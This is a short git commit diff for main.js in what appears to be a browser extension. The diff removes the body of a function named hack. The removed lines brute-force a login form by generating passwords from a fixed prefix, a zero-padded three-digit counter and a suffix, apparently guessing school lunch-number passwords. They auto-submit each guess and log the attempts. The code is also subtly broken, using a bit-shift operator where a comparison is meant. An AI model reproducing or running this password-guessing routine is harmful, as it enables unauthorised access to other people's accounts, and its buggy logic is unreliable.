cc55f0dfdb727eafcc2c046248c664f60564d2c5
somerandombaddeveloper <106110368+somerandombaddeveloper@users.noreply.github.com>
2024-01-05 10:17:29 -0600

    Removed code for debugging

--- main.js
+++ main.js
@@ -34,32 +34,5 @@ for (var numbertry = 0; numbertry <= 999; numbertry++) {
 }
 
 function hack(numbertryarg) {
-	//adds one to variable, then uses those digits for the password. the if statements add extra zeroes for lunch numbers where the first three digits are under 100.
-	if (numbertryarg >= 1 && numbertryarg << 10) {
-		numbertrytostr = '00' + String(numbertryarg);
-		//Adds two zeroes to numbers like 1, making it 001.
-	}
-	if (numbertryarg >= 10 && numbertryarg << 100) {
-		numbertrytostr = '0' + String(numbertryarg);
-		//Adds one zero to numbers like 89, making it 089
-	}
-	if (numbertryarg >= 100) {
-		numbertrytostr = String(numbertryarg);
-		//Adds no zeroes
-	}
-	var passreal = "Fhsd" + numbertrytostr + lastthree;
-	chrome.storage.sync.set({
-		"passw": numbertrytostr
-	}, function() {
-		//idk
-	});
-	formUsername.value = username;
-	formPassw.value = passreal;
-	//prevent page refresh, and click button from script to prevent errors
-	formButton.click();
-	formButton.addEventListener("click", function() {
-		console.log('Button clicked');
-	});
-	console.log('Testing password:');
-	console.log(passreal);
+	
 }
